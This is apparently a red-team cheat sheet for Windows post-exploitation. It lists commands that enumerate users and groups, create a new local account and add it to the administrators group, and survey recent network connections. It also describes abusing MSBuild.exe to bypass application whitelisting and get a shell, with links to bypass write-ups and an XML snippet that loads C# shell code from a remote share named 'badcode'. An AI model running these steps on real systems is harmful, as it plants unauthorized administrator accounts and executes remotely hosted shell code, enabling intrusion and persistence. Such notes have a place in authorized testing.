```PowerShell
net user
net localgroup
net localgroup administrators
net user newUserName newUserPwd / add
net localgroup administrators newUserName / add
```
## Recent Comms
```PowerShell
netstat -n
arp -a
ipconfig /displaydns
```

## Leverage MSBuild
MSBuild.exe located @ C:\Windows\Microsoft.NET\Framework64\v4.0.30319
You can use a schema XML file to get a shell. Example:
```https://gist.github.com/ChrisTruncer/ea8b29c78f54f9eb4c7b505c27ec4c72```   
```https://fortynorthsecurity.com/blog/another-msbuild-bypass-february-2020-edition/```   
**Host the code remotely**   
```https://fortynorthsecurity.com/blog/remotely-host-msbuild-payloads/```   
```XML
<Code Type="Class" Language="cs" Source="\\127.0.0.1\badcode\shell.cs">
```   


